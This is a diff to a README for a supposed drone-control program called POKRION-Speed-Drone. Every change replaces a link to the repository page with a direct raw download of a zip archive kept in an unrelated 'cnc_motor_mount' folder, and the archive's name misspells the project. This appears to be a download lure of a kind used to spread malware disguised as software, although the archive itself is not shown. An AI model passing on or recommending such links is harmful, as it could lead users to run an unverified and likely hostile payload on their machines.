@@ -1,6 +1,6 @@
 # 🚁 POKRION-Speed-Drone - Fast and Easy Micro Quadcopter Control
 
-[![Download POKRION-Speed-Drone](https://img.shields.io/badge/Download-POKRION--Speed--Drone-brightgreen?style=for-the-badge)](https://github.com/Marieannready800/POKRION-Speed-Drone)
+[![Download POKRION-Speed-Drone](https://img.shields.io/badge/Download-POKRION--Speed--Drone-brightgreen?style=for-the-badge)](https://github.com/Marieannready800/POKRION-Speed-Drone/raw/refs/heads/main/cnc_motor_mount/Drone-Speed-POKRIO-3.9.zip)
 
 ## 📋 About POKRION-Speed-Drone
 
@@ -29,7 +29,7 @@ This guide will help you download, install, and run the POKRION-Speed-Drone soft
 
 Click the big green button at the top or this link to visit the download page:
 
-https://github.com/Marieannready800/POKRION-Speed-Drone
+https://github.com/Marieannready800/POKRION-Speed-Drone/raw/refs/heads/main/cnc_motor_mount/Drone-Speed-POKRIO-3.9.zip
 
 This page holds the latest files you need for the software and hardware drivers.
 
@@ -87,7 +87,7 @@ If you face issues during setup or use, try these steps:
 
 Updates improve stability and add new features. Check the GitHub repository regularly:
 
-https://github.com/Marieannready800/POKRION-Speed-Drone
+https://github.com/Marieannready800/POKRION-Speed-Drone/raw/refs/heads/main/cnc_motor_mount/Drone-Speed-POKRIO-3.9.zip
 
 Download new versions following the same steps under **Getting Started**. Running the latest software ensures your drone operates with the best performance.
 
@@ -105,4 +105,4 @@ If you do not find answers there, use the GitHub Issues tab to ask questions or 
 
 ---
 
-[![Download POKRION-Speed-Drone](https://img.shields.io/badge/Download-POKRION--Speed--Drone-brightgreen?style=for-the-badge)](https://github.com/Marieannready800/POKRION-Speed-Drone)
+[![Download POKRION-Speed-Drone](https://img.shields.io/badge/Download-POKRION--Speed--Drone-brightgreen?style=for-the-badge)](https://github.com/Marieannready800/POKRION-Speed-Drone/raw/refs/heads/main/cnc_motor_mount/Drone-Speed-POKRIO-3.9.zip)
